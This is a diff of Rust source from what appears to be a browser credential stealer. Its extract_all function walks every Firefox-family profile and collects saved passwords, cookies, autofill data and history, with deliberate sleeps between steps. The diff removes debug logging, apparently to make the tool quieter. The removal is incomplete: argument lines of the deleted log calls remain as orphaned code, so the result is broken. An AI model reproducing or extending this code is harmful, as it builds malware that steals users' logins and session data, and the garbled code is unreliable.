@@ -2,7 +2,6 @@ pub mod base;
 
 use std::{env, path::PathBuf};
 use crate::encrypted::*;
-use crate::dbg_log;
 
 pub struct GeckoBrowserInfo {
     pub name: String,
@@ -168,18 +167,13 @@ pub fn find_nss_dir(browser_name: &str) -> Option<PathBuf> {
 
 pub fn extract_all() -> Vec<(String, String)> {
     std::thread::sleep(std::time::Duration::from_millis(500));
-    dbg_log!("gecko::extract_all BEGIN");
     let mut results = Vec::new();
     let browsers = get_browsers();
-    dbg_log!("gecko: {} browsers registered", browsers.len());
     for browser in browsers {
-        dbg_log!("gecko: browser '{}' profiles_path={:?} exists={}",
             browser.name, browser.profiles_path, browser.profiles_path.exists());
         if !browser.profiles_path.exists() { continue; }
         let nss_dir = find_nss_dir(&browser.name);
-        dbg_log!("gecko: '{}' nss_dir={:?}", browser.name, nss_dir);
         let profiles = base::get_profiles(&browser.profiles_path);
-        dbg_log!("gecko: '{}' {} profiles found", browser.name, profiles.len());
 
         for (profile_name, profile_path) in profiles {
             std::thread::sleep(std::time::Duration::from_millis(200));
@@ -189,7 +183,6 @@ pub fn extract_all() -> Vec<(String, String)> {
             let history = base::extract_history(&profile_path);
             let autofill = base::extract_autofill(&profile_path);
 
-            dbg_log!("gecko: '{}'/'{}' pwd={:?} cook={:?} auto={:?} hist={:?}",
                 browser.name, profile_name,
                 passwords.is_some(), cookies.is_some(),
                 autofill.is_some(), history.is_some());
@@ -200,6 +193,5 @@ pub fn extract_all() -> Vec<(String, String)> {
             );
         }
     }
-    dbg_log!("gecko::extract_all END results={}", results.len());
     results
 }
